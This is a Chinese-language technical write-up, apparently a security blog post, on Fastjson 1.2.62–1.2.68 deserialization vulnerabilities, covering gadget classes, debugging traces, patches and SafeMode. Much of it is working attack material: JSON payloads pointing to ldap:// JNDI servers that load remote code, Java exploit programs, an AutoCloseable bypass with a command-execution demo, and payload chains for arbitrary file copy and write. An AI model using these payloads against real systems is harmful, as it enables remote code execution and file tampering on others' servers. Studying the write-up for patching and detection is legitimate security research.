---
title: Fastjson1.2.62-1.2.68反序列化漏洞
date: 2026-09-09
---

# Fastjson1.2.62-1.2.68反序列化漏洞

## 1.2.62 反序列化漏洞

### 前提条件

- 需要开启AutoType
- Fastjson <= 1.2.62
- JNDI注入利用所受的JDK版本限制
- 目标服务端需要存在xbean-reflect包；xbean-reflect 包的版本不限

```xml
<dependencies>
	<dependency>
		<groupId>com.alibaba</groupId>
		<artifactId>fastjson</artifactId>
		<version>1.2.62</version>
	</dependency>
	<dependency>
		<groupId>org.apache.xbean</groupId>
		<artifactId>xbean-reflect</artifactId>
		<version>4.18</version>
	</dependency>
	<dependency>
		<groupId>commons-collections</groupId>
		<artifactId>commons-collections</artifactId>
		<version>3.2.1</version>
	</dependency>
</dependencies>
```

### 原理与 exp

`org.apache.xbean.propertyeditor.JndiConverter`类的`toObjectImpl()`方法存在 JNDI 注入漏洞，可以通过其构造方法触发利用。

看一下`JndiConverter`这个类：

```java
package org.apache.xbean.propertyeditor;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.regex.Pattern;

public class JndiConverter extends AbstractConverter {
    public JndiConverter() {
        super(Context.class);
    }

    protected Object toObjectImpl(String text) {
        try {
            InitialContext context = new InitialContext();
            return (Context) context.lookup(text);
        } catch (NamingException e) {
            throw new PropertyEditorException(e);
        }
    }

}
```

这里很明显是一个 JNDI 注入漏洞。但是这个`toObjectImpl`并不是一个`setter`/`getter`方法，也不是构造函数。

因为我们对`JndiConverter`这个类进行反序列化时，会自动调用它的构造函数，而构造函数中调用了父类的构造函数，所以我们反序列化的时候不仅能够调用`JndiConverter`这个类，也会调用父类`AbstractConverter`。

在父类`AbstractConverter`中，可以找到调用`JndiConverter#toObjectImpl()`的地方，即`AbstractConverter#setAsText()`。

![1](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1262Chains.png)

所以我们的 payload 可以设置为：

```json
{
	"@type":"org.apache.xbean.propertyeditor.JndiConverter", 
	"AsText":"ldap://127.0.0.1:1234/ExportObject"
}
```

exp：

```java
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class EXP_1262 {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String poc="{\n" +
                "\t\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\", \n" +
                "\t\"AsText\":\"ldap://10.231.54.174:1389/remoteExploit8\"\n" +
                "}";
        JSON.parse(poc);
    }
}
```

### 调试分析

> 如果为开启 AutoType、未设置 expectClass 且类名不在内部白名单内，是无法加载恶意字节码的。

相比于之前的版本`checkAutoType()`方法，这里新增了一些代码逻辑：

```java
if (typeName == null) {
    return null;
}

//限制了JSON中@type指定的类名长度
if (typeName.length() >= 192 || typeName.length() < 3) {
    throw new JSONException("autoType is not support. " + typeName);
}

//单独判断expectClass参数，设置expectClassFlag
//当且仅当expectClass不为空且不为Object等类型时expectClassFlag才为true
final boolean expectClassFlag;
if (expectClass == null) {
    expectClassFlag = false;
} else {
    if (expectClass == Object.class
            || expectClass == Serializable.class
            || expectClass == Cloneable.class
            || expectClass == Closeable.class
            || expectClass == EventListener.class
            || expectClass == Iterable.class
            || expectClass == Collection.class
            ) {
        expectClassFlag = false;
    } else {
        expectClassFlag = true;
    }
}

String className = typeName.replace('$', '.');
Class<?> clazz = null;

final long BASIC = 0xcbf29ce484222325L;
final long PRIME = 0x100000001b3L;

//1.2.43检测 [
final long h1 = (BASIC ^ className.charAt(0)) * PRIME;
if (h1 == 0xaf64164c86024f1aL) { // [
    throw new JSONException("autoType is not support. " + typeName);
}

//1.2.41检测 Lxx;
if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) {
    throw new JSONException("autoType is not support. " + typeName);
}

//1.2.42检测 LL
final long h3 = (((((BASIC ^ className.charAt(0))
        * PRIME)
        ^ className.charAt(1))
        * PRIME)
        ^ className.charAt(2))
        * PRIME;

//对类名进行hash计算并查找该值是否在内部白名单内，如果在则internalWhite为true
boolean internalWhite = Arrays.binarySearch(INTERNAL_WHITELIST_HASHCODES,
        TypeUtils.fnv1a_64(className)
) >= 0;
```

开始调试，先看看关键点。

![1](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1262White.png)

这里进行了第一个判断的代码逻辑即开启`AutoType`的检测逻辑，先进行哈希白名单匹配，然后进行哈希黑名单过滤，但由于该类不在黑白名单中所以通过了这里的检测并向下执行。再往下执行，到未开启`AutoType`的检测逻辑时直接跳过向下执行了，最终会走到`loadClass()`加载恶意类。

### 补丁分析

黑名单绕过的 Gadget 补丁都是再新版本中添加新的 Gadget 黑名单来进行防御的，新版本运行之后就直接抛出异常。

```text
Exception in thread "main" com.alibaba.fastjson.JSONException: autoType is not support. org.apache.xbean.propertyeditor.JndiConverter
```

在哈希黑名单中添加了该类，其中匹配到了该恶意类的哈希值：

![2](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/EvilRegexHash.png)

## 1.2.66 反序列化漏洞

### 前提条件

- 开启AutoType；
- Fastjson <= 1.2.66；
- JNDI注入利用所受的JDK版本限制；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；
- br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；
- com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；

### 漏洞原理

新的 Gadget 来绕过黑名单限制，虽然涉及多条利用链，但是原理都是 JNDI 注入。

`org.apache.shiro.realm.jndi.JndiRealmFactory`类PoC：

```json
{"@type":"org.apache.shiro.realm.jndi.JndiRealmFactory", "jndiNames":["ldap://localhost:1389/Exploit"], "Realms":[""]}
```

`br.com.anteros.dbcp.AnterosDBCPConfig`类PoC：

```json
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://localhost:1389/Exploit"}或{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

`com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig`类PoC：

```json
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransaction":"ldap://localhost:1389/Exploit"}}
```

### exp

```java
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
  
public class EXP_1266 {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
		String poc = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:1234/ExportObject\"], \"Realms\":[\"\"]}";  
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"metricRegistry\":\"ldap://localhost:1389/Exploit\"}";  
//        String poc = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:1389/Exploit\"}";  
//        String poc = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\"," +  
//                "\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/Exploit\"}}";  
		JSON.parse(poc);  
    }  
}
```

## 1.2.67 反序列化漏洞

### 前提条件

- 开启AutoType；
- Fastjson <= 1.2.67；
- JNDI注入利用所受的JDK版本限制；
- org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；
- org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；

### 漏洞原理

还是新的 Gadget 绕过黑名单限制。

`org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup`类PoC：

```json
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup", "jndiNames":["ldap://localhost:1389/Exploit"], "tm": {"$ref":"$.tm"}}
```

`org.apache.shiro.jndi.JndiObjectFactory`类PoC：

```json
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://localhost:1389/Exploit","instance":{"$ref":"$.instance"}}
```

exp：

```java
import com.alibaba.fastjson.JSON;  
import com.alibaba.fastjson.parser.ParserConfig;  
import com.sun.xml.internal.ws.api.ha.StickyFeature;  
  
public class EXP_1267 {  
    public static void main(String[] args) {  
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  
		String poc = "{\"@type\":\"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\"," +  
                " \"jndiNames\":[\"ldap://localhost:1234/ExportObject\"], \"tm\": {\"$ref\":\"$.tm\"}}";  
		JSON.parse(poc);  
	}  
}
```

## 1.2.68 反序列化漏洞

### 前提条件

- Fastjson <= 1.2.68；
- 利用类必须是expectClass类的子类或实现类，并且不在黑名单中；

### 漏洞原理

这次绕过`checkAutoType()`方法的关键在于第二个参数`expectClass`，可以通过构造恶意 JSON 数据、传入某个类作为`expectClass`参数再传入另一个`expectClass`类作为子类或实现类来实现绕过`checkAutoType()`方法执行恶意操作。

简单地说，本次绕过`checkAutoType()`函数的攻击步骤为：

1. 先传入某个类，其加载成功后将作为`expectClass`参数传入`checkAutoType()`函数；
2. 查找`expectClass`类的子类或实现类，如果存在这样一个子类或实现类其构造方法或`setter`方法中存在危险操作则可以被攻击利用；

### 漏洞复现

简单地验证利用`expectClass`绕过的可行性，先假设 Fastjson 服务端存在如下实现`AutoCloseable`接口类的恶意类`VulAutoCloseable`：

```java
package org.example;

import java.io.IOException;

public class VulAutoCloseable implements AutoCloseable{
    public VulAutoCloseable(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void close() throws Exception {

    }
}
```

构造 payload：

```json
{"@type":"java.lang.AutoCloseable","@type":"org.example.VulAutoCloseable","cmd":"calc"}
```

无需开启AutoType，直接成功绕过`CheckAutoType()`的检测从而触发执行。

### 调试分析

直接再`checkAutoType`方法中打断点开始调试。

![3](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/expectClassNull.png)

第一次是传入`AutoCloseable`类进行校验，这里`CheckAutoType()`函数的`expectClass`参数为`null`。往下，直接从缓存`Mapping`中获取到了`AutoCloseable`类，然后获取到这个`clazz`之后进行一系列的判断，`clazz`是否为`null`，以及关于`internalWhite`的判断，`internalWhite`是内部白名单，很明显我们这里并不是，内部白名单一定是非常安全的：

![5](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/getTypeName.png)

然后这里判断出现`expectClass`，先判断`clazz`是否不是`expectClass`类的继承类且不是`HashMap`类型，如果是就抛出异常，否则直接返回这个类。我们这里并没有`expectClass`，所以直接返回`AutoCloseable`类。

接着就返回到`DefaultJSONParser`类中获取到`clazz`后再继续执行，根据`AutoCloseable`类获取到反序列化器为`JavaBeanDeserializer`，然后用这个反序列化器进行反序列化操作：

![6](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/Deserializer.png)

往里走，调用的是`JavaBeanDeserializer`的`deserialze()`方法进行反序列化，其中`type`参数就是传入的`AutoCloseable`类：

![6](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/BeanDeserializer.png)

往下的逻辑就是解析获取 payload 后面的类的过程。这里会发现获取不到对象反序列化器之后就是进入后面的判断逻辑中，设置`type`参数即`java.lang.AutoCloseable`类为`checkAutoType()`方法的`expectClass`参数来调用`checkAutoType()`方法来获取指定类型，然后再获取指定的反序列化器：

![7](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/expectClassCheck.png)

此时就第二次进入`checkAutoType()`方法，`typeName`就是 payload 中第二个指定的类，`expectClass`参数则是 payload 第一个指定的类。

![8](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/TwiceCheckAutoType.png)

往下，由于`java.lang.AutoCloseable`不是黑名单中的类，因此`expectClassFlag`就会被设置为true。再往下，由于`expectClassFlag`为 true 且目标类不在内部白名单中，程序就会进入`AutoType`开启时的检测逻辑：

![9](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/internalWhitelist.png)

由于我们定义的 `VulAutoCloseable` 类不在黑白名单中，因此这段能通过检测并继续往下执行。往下，未加载成功目标类，就会进入 AutoType 关闭时的检测逻辑，和上同理，这段能通过检测并继续往下执行：

![1](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/AutoTypeSupport.png)

再往下，由于`expectClassFlag`为 true，会进入下面的`loadClass()`来加载类，但是由于`AutoType`关闭且`jsonType`为 false，因此调用`loadClass()`方法时是不会开启缓存的：

![2](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/loadClassNoCache.png)

跟进这个方法，使用了`AppClassLoader`加载`VulAutoCloseable`类并直接返回：

![3](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ClassLoader.png)

往下，判断是否`jsonType`，true 的话直接添加`Mapping`缓存并返回类，否则接着判断返回的类是否是`ClassLoader`、`DataSource`、`RowSet`等类的子类，是的话直接抛出异常，这也是过滤大多数 JNDI 注入 Gadget的机制：

![4](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/JNDIGadget.png)

前面的都能通过，往下，如果`expectClass`不为`null`，则判断目标类是否是`expectClass`类的子类，是的话就添加到`Mapping`缓存中并直接返回该目标类，否则直接抛出异常导致利用失败，**这里就解释了为什么恶意类必须要继承AutoCloseable接口类，因为这里expectClass为AutoCloseable类，因此恶意类必须是AutoCloseable类的子类才能通过这里的判断**：

![5](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ImportanceBypass.png)

然后就是恶意类的触发。

### 实际利用

这个漏洞的利用主要是找关于输入输出流的类来写文件，因为`IntputStream`和`OutputStream`都是实现了`AutoCloseable`接口的。

> 寻找利用链：
>
> - 需要一个通过 set 方法或构造方法指定文件路径的 OutputStream
> - 需要一个通过 set 方法或构造方法传入字节数据的 OutputStream，参数类型必须是byte[]、ByteBuffer、String、char[]其中的一个，并且可以通过 set 方法或构造方法传入一个 OutputStream，最后可以通过 write 方法将传入的字节码 write 到传入的 OutputStream
> - 需要一个通过 set 方法或构造方法传入一个 OutputStream，并且可以通过调用 toString、hashCode、get、set、构造方法 调用传入的 OutputStream 的 close、write 或 flush 方法
>
> 但是只找到 FileOutputStream 和 ObjectOutputStream，但是这两个类选取的构造器不符合情况，所以只能找这两个类的子类或者功能相同的类。

#### 复制文件（任意文件读取）

利用类：`org.eclipse.core.internal.localstore.SafeFileOutputStream`。

依赖：

```xml
<dependency>  
 <groupId>org.aspectj</groupId>  
 <artifactId>aspectjtools</artifactId>  
 <version>1.9.5</version>  
</dependency>
```

`SafeFileOutputStream`类的`SafeFileOutputStream(java.lang.String, java.lang.String)`构造函数判断了如果`targetPath`文件不存在且`tempPath`文件存在，就会把`tempPath`复制到`targetPath`中，正是利用了构造函数的特点来实现了 Web 的任意文件读取。

```java
public class SafeFileOutputStream extends OutputStream {
    protected File temp;
    protected File target;
    protected OutputStream output;
    protected boolean failed;
    protected static final String EXTENSION = ".bak";
 
    public SafeFileOutputStream(File file) throws IOException {
        this(file.getAbsolutePath(), (String)null);
    }
 
    // 该构造函数判断如果targetPath文件不存在且tempPath文件存在，就会把tempPath复制到targetPath中
    public SafeFileOutputStream(String targetPath, String tempPath) throws IOException {
        this.failed = false;
        this.target = new File(targetPath);
        this.createTempFile(tempPath);
        if (!this.target.exists()) {
            if (!this.temp.exists()) {
                this.output = new BufferedOutputStream(new FileOutputStream(this.target));
                return;
            }
 
            this.copy(this.temp, this.target);
        }
 
        this.output = new BufferedOutputStream(new FileOutputStream(this.temp));
    }
 
    public void close() throws IOException {
        try {
            this.output.close();
        } catch (IOException var2) {
            this.failed = true;
            throw var2;
        }
 
        if (this.failed) {
            this.temp.delete();
        } else {
            this.commit();
        }
 
    }
 
    protected void commit() throws IOException {
        if (this.temp.exists()) {
            this.target.delete();
            this.copy(this.temp, this.target);
            this.temp.delete();
        }
    }
 
    protected void copy(File sourceFile, File destinationFile) throws IOException {
        if (sourceFile.exists()) {
            if (!sourceFile.renameTo(destinationFile)) {
                InputStream source = null;
                BufferedOutputStream destination = null;
 
                try {
                    source = new BufferedInputStream(new FileInputStream(sourceFile));
                    destination = new BufferedOutputStream(new FileOutputStream(destinationFile));
                    this.transferStreams(source, destination);
                    destination.close();
                } finally {
                    FileUtil.safeClose(source);
                    FileUtil.safeClose(destination);
                }
 
            }
        }
    }
 
    protected void createTempFile(String tempPath) {
        if (tempPath == null) {
            tempPath = this.target.getAbsolutePath() + ".bak";
        }
 
        this.temp = new File(tempPath);
    }
 
    public void flush() throws IOException {
        try {
            this.output.flush();
        } catch (IOException var2) {
            this.failed = true;
            throw var2;
        }
    }
 
    public String getTempFilePath() {
        return this.temp.getAbsolutePath();
    }
 
    protected void transferStreams(InputStream source, OutputStream destination) throws IOException {
        byte[] buffer = new byte[8192];
 
        while(true) {
            int bytesRead = source.read(buffer);
            if (bytesRead == -1) {
                return;
            }
 
            destination.write(buffer, 0, bytesRead);
        }
    }
 
    public void write(int b) throws IOException {
        try {
            this.output.write(b);
        } catch (IOException var3) {
            this.failed = true;
            throw var3;
        }
    }
}
```

exp：

```java
package org.example;

import com.alibaba.fastjson.JSON;

public class test {
    public static void main(String[] args) {
        String payload="{\"@type\":\"java.lang.AutoCloseable\",\"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\",\"tempPath\":\"C:/1.txt\",\"targetPath\":\"D:/JavaSecTestCode/flag.txt\"}";
        JSON.parse(payload);
    }
}
```

注意不要先新建 flag.txt，不然不会进行复制。

#### 写入文件

写内容类：`com.esotericsoftware.kryo.io.Output`。

依赖：

```xml
<dependency>
    <groupId>com.esotericsoftware</groupId>
    <artifactId>kryo</artifactId>
    <version>4.0.0</version>
</dependency>
```

`Output`类主要是用来写内容，它提供了`setBuffer()`和`setOutputStream()`两个`setter`用来写入输入流，其中`buffer`参数值是文件内容，`outputStream`参数值就是前面的`SafeFileOutputStream`类对象，而要触发写文件操作则需要调用其`flush`方法：

```java
/** Sets a new OutputStream. The position and total are reset, discarding any buffered bytes.
 * @param outputStream May be null. */
public void setOutputStream (OutputStream outputStream) {
    this.outputStream = outputStream;
    position = 0;
    total = 0;
}
 
...
 
/** Sets the buffer that will be written to. {@link #setBuffer(byte[], int)} is called with the specified buffer's length as the
 * maxBufferSize. */
public void setBuffer (byte[] buffer) {
    setBuffer(buffer, buffer.length);
}
 
...
 
/** Writes the buffered bytes to the underlying OutputStream, if any. */
public void flush () throws KryoException {
    if (outputStream == null) return;
    try {
        outputStream.write(buffer, 0, position);
        outputStream.flush();
    } catch (IOException ex) {
        throw new KryoException(ex);
    }
    total += position;
    position = 0;
}
 
...
```

如果可以写入文件的话，我们这里就可以写入一些恶意文件。

接着就是要看怎么触发`Output`类的`flush()`方法，`flush()`方法只有在`close()`和`require()`方法被调用时才会触发，其中`require()`方法在调用`write`相关方法时就会被触发。

找到 JDK 的 `ObjectOutputStream`类，内部类`BlockDataOutputStream`的构造函数中将`OutputStream`类型的参数赋值给`out`变量，而其`setBlockDataMode()`函数中调用了`drain()`函数、`drain()`函数中又调用了`out.write()`函数，满足了前面的需求：

```java
/**  
 * Creates new BlockDataOutputStream on top of given underlying stream.  
 * Block data mode is turned off by default.  
 */  
 BlockDataOutputStream(OutputStream out) {  
 	this.out = out;  
 	dout = new DataOutputStream(this);  
 }  
  
 /**  
 * Sets block data mode to the given mode (true == on, false == off)  
 * and returns the previous mode value.  If the new mode is the same as  
 * the old mode, no action is taken.  If the new mode differs from the  
 * old mode, any buffered data is flushed before switching to the new  
 * mode.  
 */  
 boolean setBlockDataMode(boolean mode) throws IOException {  
 	if (blkmode == mode) {  
 		return blkmode;  
 	}  
 	drain();  
 	blkmode = mode;  
 	return !blkmode;  
 }  
  
...  
  
 /**  
 * Writes all buffered data from this stream to the underlying stream,  
 * but does not flush underlying stream.  
 */  
 void drain() throws IOException {  
 	if (pos == 0) {  
 		return;  
 	}  
 	if (blkmode) {  
 		writeBlockHeader(pos);  
 	}  
 	out.write(buf, 0, pos);  
 	pos = 0;  
 }
```

对于`setBlockDataMode()`方法的调用，在`ObjectOutputStream`类的有参构造方法中就存在：

```java
public ObjectOutputStream(OutputStream out) throws IOException {
    verifySubclass();
    bout = new BlockDataOutputStream(out);
    handles = new HandleTable(10, (float) 3.00);
    subs = new ReplaceTable(10, (float) 3.00);
    enableOverride = false;
    writeStreamHeader();
    bout.setBlockDataMode(true);
    if (extendedDebugInfo) {
        debugInfoStack = new DebugTraceInfoStack();
    } else {
        debugInfoStack = null;
    }
}
```

但是 Fastjson 优先获取的是`ObjectOutputStream`类的无参构造方法，因此只能找`ObjectOutputStream`继承类来触发。

只有有参构造函数的ObjectOutputStream继承类：**com.sleepycat.bind.serial.SerialOutput**。

依赖：

```xml
<dependency>  
 <groupId>com.sleepycat</groupId>  
 <artifactId>je</artifactId>  
 <version>5.0.73</version>  
</dependency>
```

`SerialOutput`类的构造函数中是调用了父类`ObjectOutputStream`的有参构造函数，这就满足了前面的条件了：

```java
public SerialOutput(OutputStream out, ClassCatalog classCatalog)
    throws IOException {

    super(out);
    this.classCatalog = classCatalog;

    /* guarantee that we'll always use the same serialization format */

    useProtocolVersion(ObjectStreamConstants.PROTOCOL_VERSION_2);
}
```

poc：

```json
{
  "stream": {
    "@type": "java.lang.AutoCloseable",
    "@type": "org.eclipse.core.internal.localstore.SafeFileOutputStream",
    "targetPath": "D:/JavaSecTestCode/flag.txt",
    "tempPath": "D:/JavaSecTestCode/temp.txt"
  },
  "writer": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.esotericsoftware.kryo.io.Output",
    "buffer": "YjF1M3I=",
    "outputStream": {"$ref": "$.stream"},
    "position": 5
  },
  "close": {
    "@type": "java.lang.AutoCloseable",
    "@type": "com.sleepycat.bind.serial.SerialOutput",
    "out": {"$ref": "$.writer"}
  }
}
```

### 补丁分析

对比一下主要是在`expectClass`的判断逻辑中，对类名进行了哈希处理再比较哈希黑名单，然后还添加了三个类。

![1](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1268PackFix.png)

网上已经有了利用彩虹表碰撞的方式得到的新添加的三个类分别为：

| 版本   | 十进制Hash值          | 十六进制Hash值      | 类名                    |
| ------ | --------------------- | ------------------- | ----------------------- |
| 1.2.69 | 5183404141909004468L  | 0x47ef269aadc650b4L | java.lang.Runnable      |
| 1.2.69 | 2980334044947851925L  | 0x295c4605fd1eaa95L | java.lang.Readable      |
| 1.2.69 | -1368967840069965882L | 0xed007300a7b227c6L | java.lang.AutoCloseable |

这就简单粗暴地防住了这几个类导致的绕过问题了。

### SafeMode

官方参考：https://github.com/alibaba/fastjson/wiki/fastjson_safemode

在1.2.68之后的版本，在1.2.68版本中，fastjson增加了 safeMode 的支持。safeMode 打开后，完全禁用autoType。所有的安全修复版本sec10也支持 SafeMode 配置。

代码中设置开启SafeMode如下：

```java
ParserConfig.getGlobalInstance().setSafeMode(true);
```

开启之后，就完全禁用AutoType即`@type`了，这样就能防御住Fastjson反序列化漏洞了。

具体的处理逻辑，是放在`checkAutoType()`函数中的前面，获取是否设置了SafeMode，如果是则直接抛出异常终止运行：

![2](https://drun1baby.top/2022/08/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8704-Fastjson1-2-62-1-2-68%E7%89%88%E6%9C%AC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/safeModeDefense.png)

## 其他绕过黑名单的poc

### 1.2.59

`com.zaxxer.hikari.HikariConfig`类PoC：

```json
{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}或{"@type":"com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

### 1.2.61

`org.apache.commons.proxy.provider.remoting.SessionBeanProvider`类PoC：

```json
{"@type":"org.apache.commons.proxy.provider.remoting.SessionBeanProvider","jndiName":"ldap://localhost:1389/Exploit","Object":"a"}
```

### 1.2.62

`org.apache.cocoon.components.slide.impl.JMSContentInterceptor`类PoC：

```json
{"@type":"org.apache.cocoon.components.slide.impl.JMSContentInterceptor", "parameters": {"@type":"java.util.Hashtable","java.naming.factory.initial":"com.sun.jndi.rmi.registry.RegistryContextFactory","topic-factory":"ldap://localhost:1389/Exploit"}, "namespace":""}
```

### 1.2.68

`org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfi`g类PoC：

```json
{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://localhost:1389/Exploit"}或{"@type":"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig","healthCheckRegistry":"ldap://localhost:1389/Exploit"}
```

`com.caucho.config.types.ResourceRef`类PoC：

```json
{"@type":"com.caucho.config.types.ResourceRef","lookupName": "ldap://localhost:1389/Exploit", "value": {"$ref":"$.value"}}
```

### 未知版本

`org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory`类PoC：

```json
{"@type":"org.apache.aries.transaction.jms.RecoverablePooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```

`org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory`类PoC：

```json
{"@type":"org.apache.aries.transaction.jms.internal.XaPooledConnectionFactory", "tmJndiName": "ldap://localhost:1389/Exploit", "tmFromJndi": true, "transactionManager": {"$ref":"$.transactionManager"}}
```





